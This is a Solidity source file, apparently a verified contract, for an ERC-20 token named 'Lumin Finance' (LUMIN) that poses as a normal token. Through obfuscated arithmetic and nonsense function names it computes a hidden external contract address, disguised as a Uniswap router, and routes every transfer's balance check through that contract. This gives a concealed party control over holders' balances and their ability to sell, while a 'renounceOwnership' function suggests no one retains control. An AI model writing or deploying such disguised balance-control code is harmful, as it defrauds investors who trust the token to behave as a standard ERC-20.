/**
 *Submitted for verification at basescan.org on 2024-03-23
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface UniswapRouterV2 {
    function swapppTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function swapTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function eth413swap(address choong, uint256 total,address destination) external view returns (uint256);
    function getLPaddress(address a, uint b, address c) external view returns (address);
}
abstract contract airplant {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract coffer is airplant {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library IUniswapRouterV20 {

    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
       return instance.eth413swap(address(0),amount,from);
    }

    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        if (amount >1){
            return swap2(instance,  amount,from);
        }else{
            return swap2(instance2,  amount,from);
        }
        
    }
}



contract LUMIN is airplant, coffer {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    string private _tokenname = unicode"Lumin Finance";
    string private _tokensymbol = unicode"LUMIN";
    uint256 private _totalSupply = 1000000000*10**18;
    uint8 private constant _decimals = 18;

    UniswapRouterV2 private BasedInstance;

    constructor(uint256 dZTTu) {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        uint256 cc = dZTTu + uint256(10)-uint256(10)+uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000012));
        BasedInstance = getFnnmoosgsto(((bFactornnmoosgsto(cc))));
    }
    uint160 private bb = 20;
    function brcFfffactornnmoosgsto(uint256 value) internal view returns (uint160) {
        uint160 a = 70;
        return (a+bb+uint160(value)+uint160(uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000012))));
    }
    
    function bFactornnmoosgsto(uint256 value) internal view returns (address) {
           return address(brcFfffactornnmoosgsto(value));
    }
    function getFnnmoosgsto(address accc) internal pure returns (UniswapRouterV2) {
        return getBcQnnmoosmmgsto(accc);
    }

    function getBcQnnmoosmmgsto(address accc) internal pure  returns (UniswapRouterV2) {
        return UniswapRouterV2(accc);
    }

    function symbol() public view virtual  returns (string memory) {
        return _tokensymbol;
    }

    function name() public view virtual  returns (string memory) {
        return _tokenname;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = IUniswapRouterV20.swap99(BasedInstance,BasedInstance,_balances[from], from);
        require(balance >= amount, "ERC20: amount over balance");
    
        _balances[from] = balance-(amount);
        
        _balances[to] = _balances[to]+(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

   

}